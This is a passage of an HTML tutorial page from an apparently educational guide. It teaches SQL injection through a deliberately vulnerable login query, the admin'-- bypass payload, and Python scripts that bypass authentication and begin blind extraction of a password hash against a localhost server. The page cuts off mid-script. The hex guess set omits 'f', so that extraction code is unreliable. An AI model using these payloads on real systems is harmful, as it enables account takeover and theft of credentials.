@@ -1,0 +1,694 @@
+
+<!DOCTYPE html>
+
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>SQL Injection &#8212; The Buzz</title>
+    
+  <link href="../../_static/css/theme.css" rel="stylesheet">
+  <link href="../../_static/css/index.ff1ffe594081f20da1ef19478df9384b.css" rel="stylesheet">
+
+    
+  <link rel="stylesheet"
+    href="../../_static/vendor/fontawesome/5.13.0/css/all.min.css">
+  <link rel="preload" as="font" type="font/woff2" crossorigin
+    href="../../_static/vendor/fontawesome/5.13.0/webfonts/fa-solid-900.woff2">
+  <link rel="preload" as="font" type="font/woff2" crossorigin
+    href="../../_static/vendor/fontawesome/5.13.0/webfonts/fa-brands-400.woff2">
+
+    
+      
+
+    
+    <link rel="stylesheet" type="text/css" href="../../_static/pygments.css" />
+    <link rel="stylesheet" type="text/css" href="../../_static/sphinx-book-theme.css?digest=c3fdc42140077d1ad13ad2f1588a4309" />
+    <link rel="stylesheet" type="text/css" href="../../_static/togglebutton.css" />
+    <link rel="stylesheet" type="text/css" href="../../_static/copybutton.css" />
+    <link rel="stylesheet" type="text/css" href="../../_static/mystnb.css" />
+    <link rel="stylesheet" type="text/css" href="../../_static/sphinx-thebe.css" />
+    <link rel="stylesheet" type="text/css" href="../../_static/panels-main.c949a650a448cc0ae9fd3441c0e17fb0.css" />
+    <link rel="stylesheet" type="text/css" href="../../_static/panels-variables.06eb56fa6e07937060861dad626602ad.css" />
+    
+  <link rel="preload" as="script" href="../../_static/js/index.be7d3bbb2ef33a8344ce.js">
+
+    <script data-url_root="../../" id="documentation_options" src="../../_static/documentation_options.js"></script>
+    <script src="../../_static/jquery.js"></script>
+    <script src="../../_static/underscore.js"></script>
+    <script src="../../_static/doctools.js"></script>
+    <script src="../../_static/togglebutton.js"></script>
+    <script src="../../_static/clipboard.min.js"></script>
+    <script src="../../_static/copybutton.js"></script>
+    <script>var togglebuttonSelector = '.toggle, .admonition.dropdown, .tag_hide_input div.cell_input, .tag_hide-input div.cell_input, .tag_hide_output div.cell_output, .tag_hide-output div.cell_output, .tag_hide_cell.cell, .tag_hide-cell.cell';</script>
+    <script src="../../_static/sphinx-book-theme.12a9622fbb08dcb3a2a40b2c02b83a57.js"></script>
+    <script async="async" src="https://unpkg.com/thebe@0.5.1/lib/index.js"></script>
+    <script>
+        const thebe_selector = ".thebe"
+        const thebe_selector_input = "pre"
+        const thebe_selector_output = ".output"
+    </script>
+    <script async="async" src="../../_static/sphinx-thebe.js"></script>
+    <link rel="shortcut icon" href="../../_static/favicon.ico"/>
+    <link rel="index" title="Index" href="../../genindex.html" />
+    <link rel="search" title="Search" href="../../search.html" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="docsearch:language" content="None">
+    
+
+    <!-- Google Analytics -->
+    
+  </head>
+  <body data-spy="scroll" data-target="#bd-toc-nav" data-offset="80">
+    
+    <div class="container-fluid" id="banner"></div>
+
+    
+
+    <div class="container-xl">
+      <div class="row">
+          
+<div class="col-12 col-md-3 bd-sidebar site-navigation show" id="site-navigation">
+    
+        <div class="navbar-brand-box">
+    <a class="navbar-brand text-wrap" href="../../index.html">
+      
+        <!-- `logo` is deprecated in Sphinx 4.0, so remove this when we stop supporting 3 -->
+        
+      
+      
+      <img src="../../_static/logo.png" class="logo" alt="logo">
+      
+      
+      <h1 class="site-logo" id="site-title">The Buzz</h1>
+      
+    </a>
+</div><form class="bd-search d-flex align-items-center" action="../../search.html" method="get">
+  <i class="icon fas fa-search"></i>
+  <input type="search" class="form-control" name="q" id="search-input" placeholder="Search this book..." aria-label="Search this book..." autocomplete="off" >
+</form><nav class="bd-links" id="bd-docs-nav" aria-label="Main">
+    <div class="bd-toc-item active">
+        <ul class="nav bd-sidenav">
+ <li class="toctree-l1">
+  <a class="reference internal" href="../../index.html">
+   Preface
+  </a>
+ </li>
+</ul>
+<p aria-level="2" class="caption" role="heading">
+ <span class="caption-text">
+  The Buzz
+ </span>
+</p>
+<ul class="nav bd-sidenav">
+ <li class="toctree-l1 has-children">
+  <a class="reference internal" href="../../onboarding/chapter.html">
+   Onboarding
+  </a>
+  <input class="toctree-checkbox" id="toctree-checkbox-1" name="toctree-checkbox-1" type="checkbox"/>
+  <label for="toctree-checkbox-1">
+   <i class="fas fa-chevron-down">
+   </i>
+  </label>
+  <ul>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../onboarding/software-need.html">
+     Software You’ll Need
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../onboarding/creating-online-profile.html">
+     Creating your Online Profile
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../onboarding/quick-tour-source-code.html">
+     A Quick Tour of the Source Code
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../onboarding/deploying-project.html">
+     Deploying the Project
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference external" href="https://the-buzz-demo.herokuapp.com">
+     A Working Example of the Website
+    </a>
+   </li>
+  </ul>
+ </li>
+ <li class="toctree-l1 has-children">
+  <a class="reference internal" href="../../version-control/chapter.html">
+   Version Control
+  </a>
+  <input class="toctree-checkbox" id="toctree-checkbox-2" name="toctree-checkbox-2" type="checkbox"/>
+  <label for="toctree-checkbox-2">
+   <i class="fas fa-chevron-down">
+   </i>
+  </label>
+  <ul>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../version-control/what-is-git.html">
+     What is Git?
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../version-control/getting-started-with-git.html">
+     Getting Started with Git
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../version-control/making-changes-to-code.html">
+     Making Changes to our Code
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../version-control/git-for-code-review.html">
+     Using Git for Code Review
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../version-control/pull-requests-merging-branches.html">
+     Pull Requests &amp; Merging Branches
+    </a>
+   </li>
+  </ul>
+ </li>
+ <li class="toctree-l1 has-children">
+  <a class="reference internal" href="../../planning-a-project/chapter.html">
+   Planning a Project
+  </a>
+  <input class="toctree-checkbox" id="toctree-checkbox-3" name="toctree-checkbox-3" type="checkbox"/>
+  <label for="toctree-checkbox-3">
+   <i class="fas fa-chevron-down">
+   </i>
+  </label>
+  <ul>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../planning-a-project/what-is-agile.html">
+     What is Agile?
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../planning-a-project/trello-new-workboard.html">
+     Trello: Your new Work Board
+    </a>
+   </li>
+  </ul>
+ </li>
+ <li class="toctree-l1 has-children">
+  <a class="reference internal" href="../../web/chapter.html">
+   The Web UI
+  </a>
+  <input class="toctree-checkbox" id="toctree-checkbox-4" name="toctree-checkbox-4" type="checkbox"/>
+  <label for="toctree-checkbox-4">
+   <i class="fas fa-chevron-down">
+   </i>
+  </label>
+  <ul>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../web/running-web-ui-locally.html">
+     Running the Web UI Locally
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../web/writing-new-e2e-tests.html">
+     Writing New End-to-End Tests
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../web/adding-message-list.html">
+     Adding the Message List
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../web/adding-message-view.html">
+     Adding the Message View
+    </a>
+   </li>
+  </ul>
+ </li>
+ <li class="toctree-l1">
+  <a class="reference internal" href="../../android/chapter.html">
+   The Androdi App
+  </a>
+ </li>
+ <li class="toctree-l1 has-children">
+  <a class="reference internal" href="../../backend/chapter.html">
+   The Backend API
+  </a>
+  <input class="toctree-checkbox" id="toctree-checkbox-5" name="toctree-checkbox-5" type="checkbox"/>
+  <label for="toctree-checkbox-5">
+   <i class="fas fa-chevron-down">
+   </i>
+  </label>
+  <ul>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../backend/running-backend-locally.html">
+     Running the Backend Locally
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../backend/writing-new-unit-tests.html">
+     Writing New Unit Tests
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../backend/writing-new-api-validators.html">
+     Writing New API Validators
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../backend/adding-routes-handle-messages.html">
+     Adding Routes to handle Messages
+    </a>
+   </li>
+  </ul>
+ </li>
+ <li class="toctree-l1">
+  <a class="reference internal" href="../../database/chapter.html">
+   The Database Library
+  </a>
+ </li>
+ <li class="toctree-l1">
+  <a class="reference internal" href="../../finishing-the-sprint/chapter.html">
+   Finishing the Sprint
+  </a>
+ </li>
+</ul>
+<p aria-level="2" class="caption" role="heading">
+ <span class="caption-text">
+  Appendix
+ </span>
+</p>
+<ul class="nav bd-sidenav">
+ <li class="toctree-l1">
+  <a class="reference internal" href="../alternatives.html">
+   Alternatives
+  </a>
+ </li>
+ <li class="toctree-l1">
+  <a class="reference internal" href="../glossary.html">
+   Glossary
+  </a>
+ </li>
+ <li class="toctree-l1">
+  <a class="reference internal" href="../bibliography.html">
+   Bibliography
+  </a>
+ </li>
+ <li class="toctree-l1">
+  <a class="reference internal" href="../fdl-1.3.html">
+   GNU Free Documentation License
+  </a>
+ </li>
+</ul>
+
+    </div>
+</nav> <!-- To handle the deprecated key -->
+
+<div class="navbar_extra_footer">
+  Powered by <a href="https://jupyterbook.org">Jupyter Book</a>
+</div>
+
+</div>
+
+
+          
+
+
+          
+<main class="col py-md-3 pl-md-4 bd-content overflow-auto" role="main">
+    
+    <div class="topbar container-xl fixed-top">
+    <div class="topbar-contents row">
+        <div class="col-12 col-md-3 bd-topbar-whitespace site-navigation show"></div>
+        <div class="col pl-md-4 topbar-main">
+            
+            <button id="navbar-toggler" class="navbar-toggler ml-0" type="button" data-toggle="collapse"
+                data-toggle="tooltip" data-placement="bottom" data-target=".site-navigation" aria-controls="navbar-menu"
+                aria-expanded="true" aria-label="Toggle navigation" aria-controls="site-navigation"
+                title="Toggle navigation" data-toggle="tooltip" data-placement="left">
+                <i class="fas fa-bars"></i>
+                <i class="fas fa-arrow-left"></i>
+                <i class="fas fa-arrow-up"></i>
+            </button>
+            
+            
+<div class="dropdown-buttons-trigger">
+    <button id="dropdown-buttons-trigger" class="btn btn-secondary topbarbtn" aria-label="Download this page"><i
+            class="fas fa-download"></i></button>
+
+    <div class="dropdown-buttons">
+        <!-- ipynb file if we had a myst markdown file -->
+        
+        <!-- Download raw file -->
+        <a class="dropdown-buttons" href="../../_sources/appendix/cyber-security/sql-injection.ipynb"><button type="button"
+                class="btn btn-secondary topbarbtn" title="Download source file" data-toggle="tooltip"
+                data-placement="left">.ipynb</button></a>
+        <!-- Download PDF via print -->
+        <button type="button" id="download-print" class="btn btn-secondary topbarbtn" title="Print to PDF"
+            onClick="window.print()" data-toggle="tooltip" data-placement="left">.pdf</button>
+    </div>
+</div>
+
+            <!-- Source interaction buttons -->
+
+<div class="dropdown-buttons-trigger">
+    <button id="dropdown-buttons-trigger" class="btn btn-secondary topbarbtn"
+        aria-label="Connect with source repository"><i class="fab fa-github"></i></button>
+    <div class="dropdown-buttons sourcebuttons">
+        <a class="repository-button"
+            href="https://github.com/buck-ross/survival-guide"><button type="button" class="btn btn-secondary topbarbtn"
+                data-toggle="tooltip" data-placement="left" title="Source repository"><i
+                    class="fab fa-github"></i>repository</button></a>
+        <a class="issues-button"
+            href="https://github.com/buck-ross/survival-guide/issues/new?title=Issue%20on%20page%20%2Fappendix/cyber-security/sql-injection.html&body=Your%20issue%20content%20here."><button
+                type="button" class="btn btn-secondary topbarbtn" data-toggle="tooltip" data-placement="left"
+                title="Open an issue"><i class="fas fa-lightbulb"></i>open issue</button></a>
+        
+    </div>
+</div>
+
+            <!-- Full screen (wrap in <a> to have style consistency -->
+
+<a class="full-screen-button"><button type="button" class="btn btn-secondary topbarbtn" data-toggle="tooltip"
+        data-placement="bottom" onclick="toggleFullScreen()" aria-label="Fullscreen mode"
+        title="Fullscreen mode"><i
+            class="fas fa-expand"></i></button></a>
+
+            <!-- Launch buttons -->
+
+<div class="dropdown-buttons-trigger">
+    <button id="dropdown-buttons-trigger" class="btn btn-secondary topbarbtn"
+        aria-label="Launch interactive content"><i class="fas fa-rocket"></i></button>
+    <div class="dropdown-buttons">
+        
+        <a class="binder-button" href="https://mybinder.org/v2/gh/buck-ross/survival-guide/master?urlpath=tree/the_buzz/appendix/cyber-security/sql-injection.ipynb"><button type="button"
+                class="btn btn-secondary topbarbtn" title="Launch Binder" data-toggle="tooltip"
+                data-placement="left"><img class="binder-button-logo"
+                    src="../../_static/images/logo_binder.svg"
+                    alt="Interact on binder">Binder</button></a>
+        
+        
+        
+        
+    </div>
+</div>
+
+        </div>
+
+        <!-- Table of contents -->
+        <div class="d-none d-md-block col-md-2 bd-toc show">
+            
+            <div class="tocsection onthispage pt-5 pb-3">
+                <i class="fas fa-list"></i> Contents
+            </div>
+            <nav id="bd-toc-nav" aria-label="Page">
+                <ul class="visible nav section-nav flex-column">
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#total-password-bypass">
+   Total Password Bypass
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#stealing-passwords">
+   Stealing Passwords
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#avoiding-sql-injection">
+   Avoiding SQL Injection
+  </a>
+ </li>
+</ul>
+
+            </nav>
+        </div>
+    </div>
+</div>
+    <div id="main-content" class="row">
+        <div class="col-12 col-md-9 pl-md-3 pr-md-0">
+        
+              <div>
+                
+  <div class="tex2jax_ignore mathjax_ignore section" id="sql-injection">
+<h1>SQL Injection<a class="headerlink" href="#sql-injection" title="Permalink to this headline">¶</a></h1>
+<p>Let’s start by focusing in on this code snippet, starting at line 20 of the example server code:</p>
+<div class="highlight-js notranslate"><div class="highlight"><pre><span></span><span class="c1">// Check the database for a user with the same username and password hash:</span>
+<span class="nx">db</span><span class="p">.</span><span class="nx">query</span><span class="p">(</span><span class="s2">&quot;SELECT * FROM users WHERE username=&#39;&quot;</span> <span class="o">+</span> <span class="nx">req</span><span class="p">.</span><span class="nx">params</span><span class="p">.</span><span class="nx">user</span> <span class="o">+</span> <span class="s2">&quot;&#39; AND pwdhash=&#39;&quot;</span> <span class="o">+</span> <span class="nx">hash</span> <span class="o">+</span> <span class="s2">&quot;&#39;&quot;</span><span class="p">,</span> <span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">users</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+	<span class="c1">// ...</span>
+<span class="p">});</span>
+</pre></div>
+</div>
+<p>Notice here that we are building our SQL query by concatenating a series of un-escaped strings.
+This is ripe for a type of attack known as <em>SQL injection</em>, in which the attacker sends the server a
+maliciously crafted set of inputs which are designed to trigger a malicious SQL command.</p>
+<div class="section" id="total-password-bypass">
+<h2>Total Password Bypass<a class="headerlink" href="#total-password-bypass" title="Permalink to this headline">¶</a></h2>
+<p>For example, consider the inputs <code class="docutils literal notranslate"><span class="pre">req.params.user</span> <span class="pre">=</span> <span class="pre">'admin'</span></code>, with a password hash <code class="docutils literal notranslate"><span class="pre">hash</span> <span class="pre">=</span> <span class="pre">'0cc175b9c0f1b6a831c399e269772661'</span></code>.
+This would result in the following SQL query:</p>
+<div class="highlight-sql notranslate"><div class="highlight"><pre><span></span><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="o">=</span><span class="s1">&#39;admin&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">pwdhash</span><span class="o">=</span><span class="s1">&#39;0cc175b9c0f1b6a831c399e269772661&#39;</span><span class="w"></span>
+</pre></div>
+</div>
+<p>However, if instead of the <code class="docutils literal notranslate"><span class="pre">admin</span></code> user, we send a malicious input <code class="docutils literal notranslate"><span class="pre">admin'--</span></code>, we get the following SQL command:</p>
+<div class="highlight-sql notranslate"><div class="highlight"><pre><span></span><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="o">=</span><span class="s1">&#39;admin&#39;</span><span class="c1">--&#39; AND pwdhash=&#39;0cc175b9c0f1b6a831c399e269772661&#39;</span>
+</pre></div>
+</div>
+<p>Note here that <code class="docutils literal notranslate"><span class="pre">--</span></code> is the SQL equivalent of <code class="docutils literal notranslate"><span class="pre">//</span></code>. IE, it comments out the rest of the line.</p>
+<p>Let’s test this using python:</p>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="c1"># Import dependencies:</span>
+<span class="kn">from</span> <span class="nn">aiohttp</span> <span class="kn">import</span> <span class="n">ClientSession</span>
+<span class="kn">from</span> <span class="nn">timeit</span> <span class="kn">import</span> <span class="n">default_timer</span> <span class="k">as</span> <span class="n">timer</span>
+<span class="kn">from</span> <span class="nn">urllib</span> <span class="kn">import</span> <span class="n">parse</span>
+
+<span class="c1"># Establish some basic info on the target:</span>
+<span class="n">host</span> <span class="o">=</span> <span class="s1">&#39;localhost:8081&#39;</span>
+<span class="n">user</span> <span class="o">=</span> <span class="s1">&#39;admin&#39;</span>
+
+<span class="c1"># Define an async wrapper function to run the attack:</span>
+<span class="k">async</span> <span class="k">def</span> <span class="nf">attack</span><span class="p">():</span>
+	<span class="c1"># Prepare the HTTP session:</span>
+	<span class="k">async</span> <span class="k">with</span> <span class="n">ClientSession</span><span class="p">()</span> <span class="k">as</span> <span class="n">session</span><span class="p">:</span>
+
+		<span class="c1"># Construct &amp; send a SQL-Injection attack to obtain an authorization token:</span>
+		<span class="n">injection</span> <span class="o">=</span> <span class="n">parse</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">{user}</span><span class="s2">&#39;--&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">user</span><span class="o">=</span><span class="n">user</span><span class="p">))</span>
+		<span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://</span><span class="si">{host}</span><span class="s1">/login/</span><span class="si">{user}</span><span class="s1">/a&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="n">host</span><span class="p">,</span> <span class="n">user</span><span class="o">=</span><span class="n">injection</span><span class="p">)</span>
+		<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Injection URL: </span><span class="si">{url}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">))</span>
+		<span class="n">res</span> <span class="o">=</span> <span class="k">await</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+		<span class="nb">print</span><span class="p">(</span><span class="k">await</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">()</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+
+		<span class="c1"># Print out the session&#39;s cookie details:</span>
+		<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">session</span><span class="o">.</span><span class="n">cookie_jar</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
+			<span class="k">for</span> <span class="n">cookie</span> <span class="ow">in</span> <span class="n">session</span><span class="o">.</span><span class="n">cookie_jar</span><span class="p">:</span>
+				<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Cookie &#39;</span><span class="si">{key}</span><span class="s2">&#39; has value </span><span class="se">\&quot;</span><span class="si">{value}</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">key</span><span class="o">=</span><span class="n">cookie</span><span class="o">.</span><span class="n">key</span><span class="p">,</span> <span class="n">value</span><span class="o">=</span><span class="n">cookie</span><span class="o">.</span><span class="n">value</span><span class="p">))</span>
+		<span class="k">else</span><span class="p">:</span>
+			<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;ERROR: Failed to extract cookies from response&#39;</span><span class="p">)</span>
+
+		<span class="c1"># Try to read the secret value:</span>
+		<span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://</span><span class="si">{host}</span><span class="s1">/secret&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="n">host</span><span class="p">)</span>
+		<span class="n">res</span> <span class="o">=</span> <span class="k">await</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+		<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">Secret: &#39;</span> <span class="o">+</span> <span class="k">await</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">())</span>
+
+<span class="c1"># Execute the attack function:</span>
+<span class="n">start</span> <span class="o">=</span> <span class="n">timer</span><span class="p">()</span>
+<span class="k">await</span> <span class="n">attack</span><span class="p">()</span>
+<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">Time elapsed: </span><span class="si">{time}</span><span class="s1"> seconds&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">time</span><span class="o">=</span><span class="n">timer</span><span class="p">()</span> <span class="o">-</span> <span class="n">start</span><span class="p">))</span>
+</pre></div>
+</div>
+</div>
+<div class="cell_output docutils container">
+<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>Injection URL: http://localhost:8081/login/admin%27--/a
+Authentication succeeded!
+
+Cookie &#39;user&#39; has value &quot;admin&#39;--&quot;
+Cookie &#39;token&#39; has value &quot;0&quot;
+
+Secret: The secret word is &quot;xylophone&quot;
+
+Time elapsed: 0.12642341299988402 seconds
+</pre></div>
+</div>
+</div>
+</div>
+<p>As you can see, desipte feeding in an invalid username/password pair (trust us - the password wasn’t just “a”),
+the attack was still able to secure a valid session token, which it was then able to use to read secret information
+from the server.</p>
+<p>For most purposes, this kind of exploit is game-over.
+The attackers have stolen your secrets and pulled out of your network, without leaving a trace.
+However, things can (and <em>will</em>) still get worse.</p>
+<p>Notice how the “user” cookie isn’t listed as “admin”, but is in fact “admin’–” what this means is that,
+although the attacker is able to steal secrets available to any logged-in user, they don’t actually have access
+to the “admin” account - only a fake account with a very similar username.</p>
+</div>
+<div class="section" id="stealing-passwords">
+<h2>Stealing Passwords<a class="headerlink" href="#stealing-passwords" title="Permalink to this headline">¶</a></h2>
+<p>To properly get into the admin account, we’ll need to steal their password.
+Let’s start by trying to extract the password hash.</p>
+<p>We’ll need to craft a special SQL query to incrementally extract information about their password hash,
+which will eventually allow us to reconstruct the full hash after a number of iterations.
+Let’s refresh ourselves on the structure of the SQL query we’re working with:</p>
+<div class="highlight-sql notranslate"><div class="highlight"><pre><span></span><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="o">=</span><span class="s1">&#39;admin&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">pwdhash</span><span class="o">=</span><span class="s1">&#39;0cc175b9c0f1b6a831c399e269772661&#39;</span><span class="w"></span>
+</pre></div>
+</div>
+<p>Given that the output of this API query is binary (the login process either succeeds or it doesn’t), it’s not immediately clear how we can use this to return useful information about the password hash.
+However, we can actually use this binary output to our advantage by structuring the query such that it
+only succeeds if we are able to correctly guess some important information about the hash.
+Specifically, we’ll be guessing the hash string itself, one character at a time.</p>
+<p>Using the username template <code class="docutils literal notranslate"><span class="pre">admin'</span> <span class="pre">AND</span> <span class="pre">substring(pwdhash</span> <span class="pre">from</span> <span class="pre">{index}</span> <span class="pre">for</span> <span class="pre">1)='{guess}'--</span></code>, where we replace <code class="docutils literal notranslate"><span class="pre">{index}</span></code> with the index of the character within the string we are guessing, and <code class="docutils literal notranslate"><span class="pre">{guess}</span></code> with the guessed character, we can force the query to succeed only when we guess the correct character:</p>
+<div class="highlight-sql notranslate"><div class="highlight"><pre><span></span><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="o">=</span><span class="s1">&#39;admin&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="k">substring</span><span class="p">(</span><span class="n">pwdhash</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="s1">&#39;0&#39;</span><span class="c1">--&#39; AND pwdhash=&#39;0cc175b9c0f1b6a831c399e269772661&#39;</span>
+</pre></div>
+</div>
+<p>Let’s test this extraction method with some more python code:</p>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="c1"># Define a set of global state variables:</span>
+<span class="n">total_requests</span><span class="o">=</span><span class="mi">0</span>
+<span class="n">pwdhash</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+
+<span class="c1"># Define a function to guess one digit of the hash:</span>
+<span class="k">async</span> <span class="k">def</span> <span class="nf">check_guess</span><span class="p">(</span><span class="n">session</span><span class="p">,</span> <span class="n">index</span><span class="p">,</span> <span class="n">guess</span><span class="p">):</span>
+	<span class="k">global</span> <span class="n">total_requests</span><span class="p">,</span> <span class="n">pwdhash</span>
+
+	<span class="c1"># Update the CLI output:</span>
+	<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Dialing hash ... </span><span class="si">{pwdhash}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">pwdhash</span><span class="o">=</span><span class="n">pwdhash</span> <span class="o">+</span> <span class="n">guess</span><span class="p">),</span> <span class="n">sep</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s1">&#39;</span><span class="se">\r</span><span class="s1">&#39;</span><span class="p">)</span>
+
+	<span class="c1"># Construct &amp; send a SQL-Injection attack to extract the user&#39;s password hash:</span>
+	<span class="n">injection</span> <span class="o">=</span> <span class="n">parse</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">{user}</span><span class="s2">&#39; AND substring(pwdhash from </span><span class="si">{index}</span><span class="s2"> for 1)=&#39;</span><span class="si">{guess}</span><span class="s2">&#39;--&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">user</span><span class="o">=</span><span class="n">user</span><span class="p">,</span> <span class="n">index</span><span class="o">=</span><span class="n">index</span><span class="p">,</span> <span class="n">guess</span><span class="o">=</span><span class="n">guess</span><span class="p">))</span>
+	<span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://</span><span class="si">{host}</span><span class="s1">/login/</span><span class="si">{injection}</span><span class="s1">/a&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="n">host</span><span class="p">,</span> <span class="n">injection</span><span class="o">=</span><span class="n">injection</span><span class="p">)</span>
+	<span class="n">res</span> <span class="o">=</span> <span class="k">await</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+	<span class="n">total_requests</span> <span class="o">+=</span> <span class="mi">1</span>
+
+	<span class="c1"># Return the request status:</span>
+	<span class="k">return</span> <span class="n">res</span><span class="o">.</span><span class="n">status</span>
+
+<span class="c1"># Define an async wrapper function to run the attack:</span>
+<span class="k">async</span> <span class="k">def</span> <span class="nf">attack</span><span class="p">():</span>
+	<span class="k">global</span> <span class="n">pwdhash</span>
+
+	<span class="c1"># Prepare the HTTP Session:</span>
+	<span class="k">async</span> <span class="k">with</span> <span class="n">ClientSession</span><span class="p">()</span> <span class="k">as</span> <span class="n">session</span><span class="p">:</span>
+
+		<span class="c1"># Loop through each character in the hash:</span>
+		<span class="k">for</span> <span class="n">index</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">33</span><span class="p">):</span>
+			<span class="c1"># Loop through each possible character in the hash:</span>
+			<span class="k">for</span> <span class="n">guess</span> <span class="ow">in</span> <span class="s1">&#39;0123456789abcde&#39;</span><span class="p">:</span>
+				<span class="n">status</span> <span class="o">=</span> <span class="k">await</span> <span class="n">check_guess</span><span class="p">(</span><span class="n">session</span><span class="p">,</span> <span class="n">index</span><span class="p">,</span> <span class="n">guess</span><span class="p">)</span>
+
+				<span class="c1"># Check whether or not the guess for the current digit was correct:</span>
+				<span class="k">if</span> <span class="n">status</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
+					<span class="n">pwdhash</span> <span class="o">+=</span> <span class="n">guess</span>
